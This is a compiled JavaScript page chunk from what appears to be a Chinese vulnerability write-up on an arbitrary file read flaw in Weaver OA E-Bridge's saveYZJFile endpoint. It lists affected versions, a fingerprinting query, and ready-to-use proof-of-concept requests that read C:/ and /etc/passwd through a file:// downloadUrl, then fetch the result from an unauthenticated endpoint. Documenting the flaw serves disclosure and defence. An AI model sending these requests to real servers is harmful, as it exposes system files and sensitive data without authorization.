(window.webpackJsonp=window.webpackJsonp||[]).push([[134],{1728:function(s,e,a){s.exports=a.p+"assets/img/fanwei-1.a06f4932.png"},1729:function(s,e,a){s.exports=a.p+"assets/img/fanwei-2.128e1c40.png"},1730:function(s,e,a){s.exports=a.p+"assets/img/fanwei-3.3b1c9341.png"},1731:function(s,e,a){s.exports=a.p+"assets/img/fanwei-4.17ec7149.png"},3205:function(s,e,a){"use strict";a.r(e);var t=a(63),i=Object(t.a)({},(function(){var s=this,e=s._self._c;return e("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[e("h1",{attrs:{id:"泛微oa-e-bridge-saveyzjfile-任意文件读取漏洞"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#泛微oa-e-bridge-saveyzjfile-任意文件读取漏洞"}},[s._v("#")]),s._v(" 泛微OA E-Bridge saveYZJFile 任意文件读取漏洞")]),s._v(" "),e("h2",{attrs:{id:"漏洞描述"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[s._v("#")]),s._v(" 漏洞描述")]),s._v(" "),e("p",[s._v("泛微云桥（e-Bridge）是上海泛微公司在”互联网+”的背景下研发的一款用于桥接互联网开放资源与企业信息化系统的系统集成中间件。泛微云桥存在任意文件读取漏洞，攻击者成功利用该漏洞，可实现任意文件读取，获取敏感信息。")]),s._v(" "),e("h2",{attrs:{id:"影响版本"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#影响版本"}},[s._v("#")]),s._v(" 影响版本")]),s._v(" "),e("a-checkbox",{attrs:{checked:""}},[s._v("泛微云桥 e-Bridge 2018-2019 多个版本")]),e("br"),s._v(" "),e("h2",{attrs:{id:"网络测绘"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#网络测绘"}},[s._v("#")]),s._v(" 网络测绘")]),s._v(" "),e("a-checkbox",{attrs:{checked:""}},[s._v('title="泛微云桥e-Bridge"')]),e("br"),s._v(" "),e("h2",{attrs:{id:"漏洞复现"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[s._v("#")]),s._v(" 漏洞复现")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v("# Windows验证POC\n\n/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///C:/&fileExt=txt\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br")])]),e("p",[e("img",{attrs:{src:a(1728),alt:"img"}})]),s._v(" "),e("p",[s._v("成功返回 "),e("code",[s._v("id值")]),s._v(",说明含有此漏洞")]),s._v(" "),e("a-alert",{attrs:{type:"success",message:"调用查看文件接口访问 /file/fileNoLogin/id值",description:"",showIcon:""}}),s._v(" "),e("br"),s._v(" "),e("p",[e("img",{attrs:{src:a(1729),alt:"img"}})]),s._v(" "),e("h3",{attrs:{id:""}},[e("a",{staticClass:"header-anchor",attrs:{href:"#"}},[s._v("#")])]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v("# Linux验证POC\n\n/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///etc/passwd&fileExt=txt\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br")])]),e("p",[e("img",{attrs:{src:a(1730),alt:"img"}})]),s._v(" "),e("p",[s._v("成功返回 "),e("code",[s._v("id值")]),s._v(",说明含有此漏洞")]),s._v(" "),e("p",[s._v("调用查看文件接口访问 "),e("code",[s._v("/file/fileNoLogin/id值")])]),s._v(" "),e("p",[e("img",{attrs:{src:a(1731),alt:"img"}})])],1)}),[],!1,null,null,null);e.default=i.exports}}]);